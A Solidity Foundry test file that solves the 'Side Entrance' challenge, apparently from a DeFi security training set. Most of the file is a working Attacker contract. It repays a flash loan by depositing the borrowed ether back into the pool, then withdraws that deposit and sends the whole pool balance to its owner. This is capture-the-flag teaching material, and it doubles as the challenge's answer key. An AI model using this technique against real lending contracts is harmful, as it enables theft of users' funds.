// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolTest is Test {
    SideEntranceLenderPool private pool;
    Attacker private attacker;
    address private player;
    uint256 private constant POOL_INITIAL_BALANCE = 1000 ether;
    uint256 private constant PLAYER_INITIAL_BALANCE = 1 ether;

    function setUp() public {
        pool = new SideEntranceLenderPool();
        address(pool).call{value: POOL_INITIAL_BALANCE}(abi.encodeWithSelector(pool.deposit.selector));

        player = makeAddr("player");
        vm.deal(player, PLAYER_INITIAL_BALANCE);

        assertEq(address(pool).balance, POOL_INITIAL_BALANCE);
        assertEq(address(player).balance, PLAYER_INITIAL_BALANCE);

        vm.startPrank(player);
        attacker = new Attacker(address(pool));
        vm.stopPrank();
    }

    function testAttack() public {
        // Exploit code:
        attacker.drainFunds();
        //
        validate();
    }

    function validate() public {
        assertEq(address(pool).balance, 0);
        assertGt(address(player).balance, POOL_INITIAL_BALANCE);
    }
}

// Attacker contract the malicious actor would deploy:
contract Attacker {
    address private pool;
    address owner;

    constructor(address p) {
        pool = p;
        owner = msg.sender;
    }

    function drainFunds() public {
        SideEntranceLenderPool(pool).flashLoan(pool.balance);
        pool.call(abi.encodeWithSelector(SideEntranceLenderPool(pool).withdraw.selector));
        owner.call{value: address(this).balance}("");
    }

    function execute() external payable {
        // deposit flash loan so balance == balanceBefore but we can withdraw the ether from it later
        pool.call{value: msg.value}(abi.encodeWithSelector(SideEntranceLenderPool(pool).deposit.selector));
    }

    receive() external payable {}
}
